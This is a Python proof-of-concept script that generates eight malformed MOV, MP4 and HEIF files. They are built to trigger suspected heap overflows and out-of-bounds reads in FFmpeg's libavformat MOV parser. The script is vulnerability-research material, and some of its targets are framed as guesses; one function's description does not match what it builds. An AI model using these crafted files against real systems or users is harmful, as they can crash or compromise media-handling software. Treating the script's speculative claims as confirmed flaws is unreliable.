#!/usr/bin/env python3
"""
PoC: Craft a malformed MOV/MP4 file to trigger heap-buffer-overflow
in libavformat/mov.c's mov_build_index() function.

Target: The interaction between stsc_data[].count values read from the stsc
atom and sample_sizes[] allocated/populated from the stsz atom. When
stsc claims more samples per chunk than stsz declares total samples,
the sample loop in mov_build_index at line ~4841 reads past
sc->sample_sizes[] if the bounds check at line 4812 is bypassed due
to sample_count being inflated by a large stsz_sample_size.

We also target potential OOB access in the tts_data arrays by providing
inconsistent stts/ctts counts relative to sample_count.
"""

import struct
import sys
import os


def make_box(box_type, data):
    """Create an MP4 box (atom)."""
    size = 8 + len(data)
    return struct.pack('>I', size) + box_type + data


def make_fullbox(box_type, version, flags, data):
    """Create an MP4 full box with version and flags."""
    return make_box(box_type, struct.pack('>I', (version << 24) | flags) + data)


def u32(val):
    return struct.pack('>I', val & 0xFFFFFFFF)


def u16(val):
    return struct.pack('>H', val & 0xFFFF)


def u8(val):
    return struct.pack('>B', val & 0xFF)


def make_ftyp():
    return make_box(b'ftyp', b'isom' + u32(0x200) + b'isomiso2mp41')


def make_mvhd():
    """Movie header box - timescale 1000, duration 1000."""
    data = u32(0)        # creation_time
    data += u32(0)       # modification_time
    data += u32(1000)    # timescale
    data += u32(1000)    # duration
    data += u32(0x00010000)  # rate (1.0)
    data += u16(0x0100)      # volume (1.0)
    data += b'\x00' * 10     # reserved
    # matrix (identity 3x3)
    data += u32(0x00010000) + u32(0) + u32(0)
    data += u32(0) + u32(0x00010000) + u32(0)
    data += u32(0) + u32(0) + u32(0x40000000)
    data += b'\x00' * 24  # pre_defined
    data += u32(2)        # next_track_ID
    return make_fullbox(b'mvhd', 0, 0, data)


def make_tkhd(track_id, width=320, height=240):
    data = u32(0)         # creation_time
    data += u32(0)        # modification_time
    data += u32(track_id) # track_ID
    data += u32(0)        # reserved
    data += u32(1000)     # duration
    data += b'\x00' * 8   # reserved
    data += u16(0)        # layer
    data += u16(0)        # alternate_group
    data += u16(0)        # volume
    data += u16(0)        # reserved
    # matrix
    data += u32(0x00010000) + u32(0) + u32(0)
    data += u32(0) + u32(0x00010000) + u32(0)
    data += u32(0) + u32(0) + u32(0x40000000)
    data += u32(width << 16)   # width (fixed point)
    data += u32(height << 16)  # height (fixed point)
    return make_fullbox(b'tkhd', 0, 3, data)  # flags=3 (enabled+in_movie)


def make_mdhd(timescale=24000):
    data = u32(0)          # creation_time
    data += u32(0)         # modification_time
    data += u32(timescale) # timescale
    data += u32(1000)      # duration
    data += u16(0x55C4)    # language (und)
    data += u16(0)         # pre_defined
    return make_fullbox(b'mdhd', 0, 0, data)


def make_hdlr(handler_type=b'vide'):
    data = u32(0)                    # pre_defined
    data += handler_type             # handler_type
    data += b'\x00' * 12            # reserved
    data += b'VideoHandler\x00'     # name
    return make_fullbox(b'hdlr', 0, 0, data)


def make_vmhd():
    data = u16(0)       # graphicsmode
    data += b'\x00' * 6  # opcolor
    return make_fullbox(b'vmhd', 0, 1, data)


def make_dref():
    entry = make_fullbox(b'url ', 0, 1, b'')  # self-contained
    data = u32(1) + entry  # entry_count=1
    return make_fullbox(b'dref', 0, 0, data)


def make_dinf():
    return make_box(b'dinf', make_dref())


def make_stsd_h264():
    """Create a minimal H.264 sample description."""
    # avc1 sample entry
    avc1_data = b'\x00' * 6   # reserved
    avc1_data += u16(1)       # data_reference_index
    avc1_data += b'\x00' * 16  # pre_defined + reserved
    avc1_data += u16(320)     # width
    avc1_data += u16(240)     # height
    avc1_data += u32(0x00480000)  # horizresolution
    avc1_data += u32(0x00480000)  # vertresolution
    avc1_data += u32(0)       # reserved
    avc1_data += u16(1)       # frame_count
    avc1_data += b'\x00' * 32  # compressorname
    avc1_data += u16(0x0018)  # depth
    avc1_data += struct.pack('>h', -1)  # pre_defined

    # Minimal avcC box
    avcc_data = bytes([
        0x01,  # configurationVersion
        0x64,  # AVCProfileIndication (High)
        0x00,  # profile_compatibility
        0x1F,  # AVCLevelIndication (3.1)
        0xFF,  # lengthSizeMinusOne = 3
        0xE1,  # numOfSequenceParameterSets = 1
        # SPS
        0x00, 0x04,  # spsLength = 4
        0x67, 0x64, 0x00, 0x1F,  # minimal SPS NAL
        0x01,  # numOfPictureParameterSets = 1
        # PPS
        0x00, 0x02,  # ppsLength = 2
        0x68, 0xCE,  # minimal PPS NAL
    ])
    avcc = make_box(b'avcC', avcc_data)
    avc1_data += avcc

    avc1 = make_box(b'avc1', avc1_data)
    data = u32(1) + avc1  # entry_count=1
    return make_fullbox(b'stsd', 0, 0, data)


def make_stts_entries(entries):
    """entries is list of (count, delta) tuples."""
    data = u32(len(entries))
    for count, delta in entries:
        data += u32(count) + u32(delta)
    return make_fullbox(b'stts', 0, 0, data)


def make_stsc_entries(entries):
    """entries is list of (first_chunk, samples_per_chunk, sample_description_index) tuples."""
    data = u32(len(entries))
    for first, count, idx in entries:
        data += u32(first) + u32(count) + u32(idx)
    return make_fullbox(b'stsc', 0, 0, data)


def make_stsz(sample_size, sample_count, sizes=None):
    """If sample_size > 0, all samples have that size. Otherwise sizes[] is used."""
    data = u32(sample_size) + u32(sample_count)
    if sample_size == 0 and sizes:
        for s in sizes:
            data += u32(s)
    return make_fullbox(b'stsz', 0, 0, data)


def make_stco(offsets):
    data = u32(len(offsets))
    for off in offsets:
        data += u32(off)
    return make_fullbox(b'stco', 0, 0, data)


def make_stss(keyframes):
    """Sync sample table."""
    data = u32(len(keyframes))
    for k in keyframes:
        data += u32(k)
    return make_fullbox(b'stss', 0, 0, data)


def make_ctts_entries(entries):
    """entries is list of (count, offset) tuples."""
    data = u32(len(entries))
    for count, offset in entries:
        data += u32(count) + u32(offset)
    return make_fullbox(b'ctts', 0, 0, data)


def make_elst_entries(entries, version=0):
    """entries is list of (duration, media_time, media_rate) tuples."""
    data = u32(len(entries))
    for duration, media_time, media_rate in entries:
        if version == 1:
            data += struct.pack('>q', duration) + struct.pack('>q', media_time)
        else:
            data += u32(duration) + struct.pack('>i', media_time)
        data += u32(media_rate)
    return make_fullbox(b'elst', version, 0, data)


def make_edts(entries, version=0):
    return make_box(b'edts', make_elst_entries(entries, version))


def build_poc_mov(output_path):
    """
    Build a MOV file that targets potential vulnerabilities in mov_build_index.

    Strategy: Create a video track with:
    - stsc claiming many samples per chunk
    - stsz with individual sample sizes (sample_size=0)
    - stts with entries whose total count exceeds actual sample_count
    - ctts with entries that don't match sample_count
    - An edit list that forces the advanced edit list path

    This tests whether mov_build_index correctly handles mismatches between
    the total sample count implied by stts and the actual sample_sizes array.
    """

    num_samples = 5
    # Create sample sizes for 5 samples
    sample_sizes = [100] * num_samples

    # stts: claim 100 samples with duration 1000 each
    # This creates a mismatch: stts says 100 samples but stsz only has 5
    stts = make_stts_entries([(100, 1000)])

    # stsc: 1 entry, first chunk = 1, 100 samples per chunk, desc index = 1
    # This claims chunk 1 has 100 samples, but stsz only provides 5 sizes
    stsc = make_stsc_entries([(1, 100, 1)])

    # stsz: 5 individual sample sizes
    stsz = make_stsz(0, num_samples, sample_sizes)

    # stco: 1 chunk offset
    stco = make_stco([0x100])

    # stss: keyframe at sample 1
    stss = make_stss([1])

    # ctts: claim 50 samples with offset 1000
    ctts = make_ctts_entries([(50, 1000)])

    # Edit list: force advanced edit list processing
    # duration=500, media_time=0 (normal edit)
    # duration=500, media_time=200 (second edit triggers "multiple_edits")
    edts = make_edts([
        (500, 0, 0x00010000),     # first edit
        (500, 200, 0x00010000),   # second edit
    ])

    stbl = make_box(b'stbl',
        make_stsd_h264() +
        stts +
        stsc +
        stsz +
        stco +
        stss +
        ctts
    )

    minf = make_box(b'minf',
        make_vmhd() +
        make_dinf() +
        stbl
    )

    mdia = make_box(b'mdia',
        make_mdhd() +
        make_hdlr() +
        minf
    )

    trak = make_box(b'trak',
        make_tkhd(1) +
        edts +
        mdia
    )

    moov = make_box(b'moov',
        make_mvhd() +
        trak
    )

    # Small mdat
    mdat = make_box(b'mdat', b'\x00' * 1024)

    with open(output_path, 'wb') as f:
        f.write(make_ftyp())
        f.write(moov)
        f.write(mdat)

    print(f"[+] Wrote PoC to {output_path} ({os.path.getsize(output_path)} bytes)")


def build_poc_stts_overflow(output_path):
    """
    Target: mov_read_stts sets sc->stts_count to min_entries even when
    fewer entries are actually read (due to atom size being smaller
    than entries*8 would require).

    We create an stts atom that declares many entries but has a small
    atom size, causing EOF in the read loop. stts_count is then set
    to a value much larger than actual entries read.
    """

    num_samples = 10
    sample_sizes = [100] * num_samples

    # Craft a raw stts atom with lying entry count
    # Declare 1000000 entries but only provide data for 2
    stts_data = u32(0)  # version+flags
    stts_data += u32(1000000)  # entries (way more than available)
    stts_data += u32(num_samples) + u32(1000)  # only 1 actual entry provided
    stts_data += u32(num_samples) + u32(1000)  # 2nd entry

    stts = make_box(b'stts', stts_data)

    stsc = make_stsc_entries([(1, num_samples, 1)])
    stsz = make_stsz(0, num_samples, sample_sizes)
    stco = make_stco([0x100])

    stbl = make_box(b'stbl',
        make_stsd_h264() +
        stts +
        stsc +
        stsz +
        stco
    )

    minf = make_box(b'minf',
        make_vmhd() +
        make_dinf() +
        stbl
    )

    mdia = make_box(b'mdia',
        make_mdhd() +
        make_hdlr() +
        minf
    )

    trak = make_box(b'trak',
        make_tkhd(1) +
        mdia
    )

    moov = make_box(b'moov',
        make_mvhd() +
        trak
    )

    mdat = make_box(b'mdat', b'\x00' * 1024)

    with open(output_path, 'wb') as f:
        f.write(make_ftyp())
        f.write(moov)
        f.write(mdat)

    print(f"[+] Wrote stts overflow PoC to {output_path} ({os.path.getsize(output_path)} bytes)")


def build_poc_truncated_stsz(output_path):
    """
    Target: Create inconsistency between stsz sample_count and actual data.

    stsz declares sample_count=100 with sample_size=0 (variable sizes)
    but only provides data for 5 sizes in the atom. The atom.size constrains
    reading so only 5 sizes are read, but sample_count stays at 100.

    When mov_build_index accesses sample_sizes[i] for i >= 5 (up to 99),
    this could be a heap-buffer-overflow on the sample_sizes array.
    """

    # We claim 100 samples but only provide 5 size entries in the atom
    declared_count = 100
    actual_sizes = [100, 200, 300, 400, 500]

    # Build stsz manually: lie about count but provide small atom
    stsz_data = u32(0)  # version+flags
    stsz_data += u32(0)  # sample_size = 0 (variable)
    stsz_data += u32(declared_count)  # sample_count = 100
    for s in actual_sizes:
        stsz_data += u32(s)  # only 5 entries provided
    stsz = make_box(b'stsz', stsz_data)

    # stts: 100 samples (to match declared count)
    stts = make_stts_entries([(declared_count, 1000)])

    # stsc: 1 chunk with 100 samples
    stsc = make_stsc_entries([(1, declared_count, 1)])

    # stco: 1 chunk
    stco = make_stco([0x100])

    stbl = make_box(b'stbl',
        make_stsd_h264() +
        stts +
        stsc +
        stsz +
        stco
    )

    minf = make_box(b'minf',
        make_vmhd() +
        make_dinf() +
        stbl
    )

    mdia = make_box(b'mdia',
        make_mdhd() +
        make_hdlr() +
        minf
    )

    trak = make_box(b'trak',
        make_tkhd(1) +
        mdia
    )

    moov = make_box(b'moov',
        make_mvhd() +
        trak
    )

    mdat = make_box(b'mdat', b'\x00' * 8192)

    with open(output_path, 'wb') as f:
        f.write(make_ftyp())
        f.write(moov)
        f.write(mdat)

    print(f"[+] Wrote truncated stsz PoC to {output_path} ({os.path.getsize(output_path)} bytes)")


def build_poc_frag_trun(output_path):
    """
    Target: Fragmented MP4 with trun that has large entry count.
    The trun handler at line 5922 computes:
      requested_size = (sti->nb_index_entries + entries) * sizeof(AVIndexEntry)
    Test if we can trigger issues with very large entries values.
    """
    # Build a minimal fragmented MP4 (moov + moof + mdat)

    # mvhd
    mvhd = make_mvhd()

    # trex (track extends) - required for fragmented MP4
    trex_data = u32(1)     # track_ID
    trex_data += u32(1)    # default_sample_description_index
    trex_data += u32(0)    # default_sample_duration
    trex_data += u32(0)    # default_sample_size
    trex_data += u32(0)    # default_sample_flags
    trex = make_fullbox(b'trex', 0, 0, trex_data)
    mvex = make_box(b'mvex', trex)

    # Minimal track with no samples (fragmented)
    stts = make_stts_entries([])
    stsc = make_stsc_entries([])
    stsz = make_stsz(0, 0, [])
    stco = make_stco([])

    stbl = make_box(b'stbl',
        make_stsd_h264() +
        stts + stsc + stsz + stco
    )
    minf = make_box(b'minf', make_vmhd() + make_dinf() + stbl)
    mdia = make_box(b'mdia', make_mdhd() + make_hdlr() + minf)
    trak = make_box(b'trak', make_tkhd(1) + mdia)

    moov = make_box(b'moov', mvhd + trak + mvex)

    # moof (movie fragment)
    # mfhd (movie fragment header)
    mfhd = make_fullbox(b'mfhd', 0, 0, u32(1))  # sequence_number=1

    # tfhd (track fragment header)
    tfhd_flags = 0x020000 | 0x08 | 0x10 | 0x20  # default-base-is-moof + dur + size + flags
    tfhd_data = u32(1)      # track_ID
    tfhd_data += u32(1000)  # default_sample_duration
    tfhd_data += u32(100)   # default_sample_size
    tfhd_data += u32(0)     # default_sample_flags
    tfhd = make_fullbox(b'tfhd', 0, tfhd_flags, tfhd_data)

    # tfdt (track fragment decode time)
    tfdt = make_fullbox(b'tfdt', 0, 0, u32(0))

    # trun with entries
    trun_flags = 0x001  # data-offset-present
    num_trun_entries = 10
    trun_data = u32(num_trun_entries)  # sample_count
    trun_data += struct.pack('>i', 0)  # data_offset (relative to moof)
    trun = make_fullbox(b'trun', 0, trun_flags, trun_data)

    traf = make_box(b'traf', tfhd + tfdt + trun)
    moof = make_box(b'moof', mfhd + traf)

    mdat = make_box(b'mdat', b'\x00' * 2048)

    with open(output_path, 'wb') as f:
        f.write(make_ftyp())
        f.write(moov)
        f.write(moof)
        f.write(mdat)

    print(f"[+] Wrote fragmented MP4 PoC to {output_path} ({os.path.getsize(output_path)} bytes)")


def build_poc_negative_ctts(output_path):
    """
    Target: ctts entries with negative (INT_MIN) composition offset values.
    This tests mov_update_dts_shift and potential signed integer overflow
    in DTS/PTS calculations.
    """
    num_samples = 10
    sample_sizes = [100] * num_samples

    stts = make_stts_entries([(num_samples, 1000)])
    stsc = make_stsc_entries([(1, num_samples, 1)])
    stsz = make_stsz(0, num_samples, sample_sizes)
    stco = make_stco([0x100])

    # ctts with INT_MIN-like negative values
    ctts_data = u32(0)  # version+flags (version 0 = unsigned, but many files use signed)
    ctts_data += u32(3)  # entries
    # Entry with very large unsigned value (interpreted as very negative signed)
    ctts_data += u32(3) + u32(0x80000000)  # count=3, offset=INT_MIN
    ctts_data += u32(3) + u32(0x80000001)  # count=3, offset=INT_MIN+1
    ctts_data += u32(4) + u32(0xFFFFFFFF)  # count=4, offset=-1
    ctts = make_box(b'ctts', ctts_data)

    stbl = make_box(b'stbl',
        make_stsd_h264() +
        stts + stsc + stsz + stco + ctts
    )
    minf = make_box(b'minf', make_vmhd() + make_dinf() + stbl)
    mdia = make_box(b'mdia', make_mdhd() + make_hdlr() + minf)
    trak = make_box(b'trak', make_tkhd(1) + mdia)
    moov = make_box(b'moov', make_mvhd() + trak)
    mdat = make_box(b'mdat', b'\x00' * 2048)

    with open(output_path, 'wb') as f:
        f.write(make_ftyp())
        f.write(moov)
        f.write(mdat)

    print(f"[+] Wrote negative ctts PoC to {output_path} ({os.path.getsize(output_path)} bytes)")


def build_poc_multi_stsd(output_path):
    """
    Target: stsc entries with id values that reference stsd entries beyond
    the allocated extradata arrays. Tests the bounds check at line 11330-11331.
    We create stsc with id=2 but only 1 stsd entry.
    """
    num_samples = 5
    sample_sizes = [100] * num_samples

    stts = make_stts_entries([(num_samples, 1000)])
    # stsc with id=5 - tries to reference 5th sample description
    stsc = make_stsc_entries([(1, num_samples, 5)])
    stsz = make_stsz(0, num_samples, sample_sizes)
    stco = make_stco([0x100])

    stbl = make_box(b'stbl',
        make_stsd_h264() +  # only 1 stsd entry
        stts + stsc + stsz + stco
    )
    minf = make_box(b'minf', make_vmhd() + make_dinf() + stbl)
    mdia = make_box(b'mdia', make_mdhd() + make_hdlr() + minf)
    trak = make_box(b'trak', make_tkhd(1) + mdia)
    moov = make_box(b'moov', make_mvhd() + trak)
    mdat = make_box(b'mdat', b'\x00' * 2048)

    with open(output_path, 'wb') as f:
        f.write(make_ftyp())
        f.write(moov)
        f.write(mdat)

    print(f"[+] Wrote multi-stsd PoC to {output_path} ({os.path.getsize(output_path)} bytes)")


def build_poc_heif_iloc(output_path):
    """
    Attempt 4: Target HEIF/AVIF parsing with crafted iloc/iinf/ipma boxes.
    The iloc parser at line 8941 reads item_count items. If we craft an iloc
    with item_count=0 but then provide a separate iinf with entries referencing
    non-existent items, followed by an ipma that associates properties with
    items that have no iloc data, this may trigger issues in heif_add_stream
    or property parsing when extent_length is uninitialized/zero.

    Also targets the iref dimg parsing which allocates grid tile lists based
    on an entries count read from the file, then accesses them without checking
    against nb_heif_item bounds.
    """
    # Build a minimal HEIF/AVIF container
    ftyp = make_box(b'ftyp', b'heic' + u32(0) + b'heic')

    # meta box (container for HEIF)
    # meta is a full box
    meta_inner = b''

    # hdlr for HEIF
    hdlr_data = u32(0)          # pre_defined
    hdlr_data += b'pict'        # handler_type
    hdlr_data += b'\x00' * 12   # reserved
    hdlr_data += b'\x00'        # name (null terminated)
    hdlr = make_fullbox(b'hdlr', 0, 0, hdlr_data)
    meta_inner += hdlr

    # pitm (primary item)
    pitm = make_fullbox(b'pitm', 0, 0, u16(1))
    meta_inner += pitm

    # iloc with 2 items
    iloc_data = b''
    iloc_data += bytes([0x44])   # offset_size=4, length_size=4
    iloc_data += bytes([0x00])   # base_offset_size=0, index_size=0
    iloc_data += u16(2)          # item_count=2

    # Item 1: item_id=1
    iloc_data += u16(1)          # item_id
    iloc_data += u16(0)          # data_reference_index
    iloc_data += u16(1)          # extent_count=1
    iloc_data += u32(0)          # extent_offset
    iloc_data += u32(100)        # extent_length

    # Item 2: item_id=2
    iloc_data += u16(2)          # item_id
    iloc_data += u16(0)          # data_reference_index
    iloc_data += u16(1)          # extent_count=1
    iloc_data += u32(100)        # extent_offset
    iloc_data += u32(100)        # extent_length

    iloc = make_fullbox(b'iloc', 0, 0, iloc_data)
    meta_inner += iloc

    # iinf with 2 items - declare item types
    iinf_inner = b''

    # infe for item 1 (hvc1)
    infe1_data = u16(1)         # item_id
    infe1_data += u16(0)        # item_protection_index
    infe1_data += b'hvc1'       # item_type
    infe1_data += b'item1\x00'  # item_name
    infe1 = make_fullbox(b'infe', 2, 0, infe1_data)

    # infe for item 2 (grid) - derived image item
    infe2_data = u16(2)         # item_id
    infe2_data += u16(0)        # item_protection_index
    infe2_data += b'grid'       # item_type
    infe2_data += b'grid\x00'   # item_name
    infe2 = make_fullbox(b'infe', 2, 0, infe2_data)

    iinf_data = u16(2) + infe1 + infe2  # entry_count=2
    iinf = make_fullbox(b'iinf', 0, 0, iinf_data)
    meta_inner += iinf

    # iref with dimg reference: item 2 (grid) references item 1
    # but with a large tile count (entries) that exceeds actual items
    iref_inner = b''
    dimg_data = u16(2)           # from_item_id = 2 (the grid item)
    dimg_data += u16(50)         # entries = 50 tile references (way more than exist)
    for i in range(50):
        dimg_data += u16(1)      # to_item_id = 1 (all reference item 1)
    dimg_box = make_box(b'dimg', dimg_data)
    iref_inner += dimg_box

    iref = make_fullbox(b'iref', 0, 0, iref_inner)
    meta_inner += iref

    # iprp with ipco + ipma
    # ipco: one ispe property
    ispe_data = u32(0)           # version+flags
    ispe_data += u32(320)        # width
    ispe_data += u32(240)        # height
    ispe = make_box(b'ispe', ispe_data)
    ipco = make_box(b'ipco', ispe)

    # ipma: associate property 1 with item 1 and item 2
    ipma_data = u32(2)           # count=2
    # Item 1
    ipma_data += u16(1)          # item_id
    ipma_data += bytes([1])      # assoc_count=1
    ipma_data += bytes([0x01])   # property_index=1 (essential=0)
    # Item 2
    ipma_data += u16(2)          # item_id
    ipma_data += bytes([1])      # assoc_count=1
    ipma_data += bytes([0x01])   # property_index=1
    ipma = make_fullbox(b'ipma', 0, 0, ipma_data)

    iprp = make_box(b'iprp', ipco + ipma)
    meta_inner += iprp

    meta = make_fullbox(b'meta', 0, 0, meta_inner)

    mdat = make_box(b'mdat', b'\x00' * 1024)

    with open(output_path, 'wb') as f:
        f.write(ftyp)
        f.write(meta)
        f.write(mdat)

    print(f"[+] Wrote HEIF iloc PoC to {output_path} ({os.path.getsize(output_path)} bytes)")


def build_poc_iref_overflow(output_path):
    """
    Attempt 5: Target mov_read_iref atom.size underflow at line 9320.
    Create an iref box where inner box 'size' field exceeds remaining atom.size,
    causing atom.size to go negative. The while(atom.size) loop at line 9294
    continues with negative values since negative != 0, parsing subsequent
    random data as iref sub-boxes.

    Also craft a MOV file with a track that has stts entries from non-fragmented
    part AND a moof/trun fragment, testing the trun memmove path when
    sc->tts_count != sti->nb_index_entries.
    """
    # Build a fragmented MP4 where the non-fragmented track has stts/ctts entries
    # but the fragment also provides trun entries

    mvhd = make_mvhd()

    # trex
    trex_data = u32(1) + u32(1) + u32(1000) + u32(100) + u32(0)
    trex = make_fullbox(b'trex', 0, 0, trex_data)
    mvex = make_box(b'mvex', trex)

    num_samples = 5
    sample_sizes = [100] * num_samples

    # Non-empty stts, stsc, stsz, stco for non-fragmented part
    stts = make_stts_entries([(num_samples, 1000)])
    stsc = make_stsc_entries([(1, num_samples, 1)])
    stsz = make_stsz(0, num_samples, sample_sizes)
    stco = make_stco([0x200])
    stss = make_stss([1])

    # Add ctts entries - more entries than actual samples to create
    # tts_count/nb_index_entries mismatch in trun path
    ctts = make_ctts_entries([
        (5, 1000),
        (5, 2000),
        (5, 3000),
    ])

    stbl = make_box(b'stbl',
        make_stsd_h264() +
        stts + stsc + stsz + stco + stss + ctts
    )
    minf = make_box(b'minf', make_vmhd() + make_dinf() + stbl)
    mdia = make_box(b'mdia', make_mdhd() + make_hdlr() + minf)
    trak = make_box(b'trak', make_tkhd(1) + mdia)

    moov = make_box(b'moov', mvhd + trak + mvex)

    # First moof fragment
    mfhd = make_fullbox(b'mfhd', 0, 0, u32(1))
    tfhd_flags = 0x020000 | 0x08 | 0x10 | 0x20
    tfhd_data = u32(1) + u32(1000) + u32(100) + u32(0)
    tfhd = make_fullbox(b'tfhd', 0, tfhd_flags, tfhd_data)
    tfdt = make_fullbox(b'tfdt', 0, 0, u32(5000))

    # trun with entries and SAMPLE_CTS flag to trigger ctts_count interaction
    trun_flags = 0x001 | 0x100 | 0x200 | 0x800  # data-offset + duration + size + CTS
    trun_entries = 20
    trun_data = u32(trun_entries)
    trun_data += struct.pack('>i', 0)  # data_offset
    for i in range(trun_entries):
        trun_data += u32(1000)   # sample_duration
        trun_data += u32(100)    # sample_size
        trun_data += struct.pack('>i', i * 100)  # CTS offset
    trun = make_fullbox(b'trun', 0, trun_flags, trun_data)

    traf = make_box(b'traf', tfhd + tfdt + trun)
    moof = make_box(b'moof', mfhd + traf)

    # Second moof with large entry count
    mfhd2 = make_fullbox(b'mfhd', 0, 0, u32(2))
    tfhd2 = make_fullbox(b'tfhd', 0, tfhd_flags, u32(1) + u32(1000) + u32(100) + u32(0))
    tfdt2 = make_fullbox(b'tfdt', 0, 0, u32(25000))

    trun2_entries = 50
    trun2_data = u32(trun2_entries)
    trun2_data += struct.pack('>i', 0)
    for i in range(trun2_entries):
        trun2_data += u32(500)
        trun2_data += u32(50)
        trun2_data += struct.pack('>i', i * 50)
    trun2 = make_fullbox(b'trun', 0, trun_flags, trun2_data)

    traf2 = make_box(b'traf', tfhd2 + tfdt2 + trun2)
    moof2 = make_box(b'moof', mfhd2 + traf2)

    mdat = make_box(b'mdat', b'\x00' * 8192)

    with open(output_path, 'wb') as f:
        f.write(make_ftyp())
        f.write(moov)
        f.write(moof)
        f.write(mdat)
        f.write(moof2)
        f.write(make_box(b'mdat', b'\x00' * 4096))

    print(f"[+] Wrote iref overflow / frag-with-stts PoC to {output_path} ({os.path.getsize(output_path)} bytes)")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <output_path>")
        sys.exit(1)

    output_base = sys.argv[1]

    # Generate multiple PoC variants
    build_poc_mov(output_base + '_v1.mov')
    build_poc_stts_overflow(output_base + '_v2.mov')
    build_poc_truncated_stsz(output_base + '_v3.mov')
    build_poc_frag_trun(output_base + '_v4.mov')
    build_poc_negative_ctts(output_base + '_v5.mov')
    build_poc_multi_stsd(output_base + '_v6.mov')
    build_poc_heif_iloc(output_base + '_v7.mov')
    build_poc_iref_overflow(output_base + '_v8.mov')

    print(f"\n[+] Generated 8 PoC files")
